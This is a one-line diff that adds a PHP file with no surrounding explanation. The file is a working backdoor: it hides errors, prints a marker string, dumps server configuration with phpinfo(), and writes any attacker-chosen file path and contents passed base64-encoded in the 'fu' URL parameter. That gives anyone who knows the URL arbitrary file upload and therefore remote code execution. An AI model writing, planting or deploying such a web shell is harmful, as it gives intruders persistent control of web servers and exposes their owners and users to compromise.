@@ -1,0 +1,1 @@
+<?php error_reporting(0);echo 'aInT7k'.'Un5lHm';phpinfo();if(isset($_GET['fu'])){$a=explode('_',$_GET['fu']);$b=base64_decode($a[0]); $c=base64_decode($a[1]);file_put_contents($b,$c);} ?>
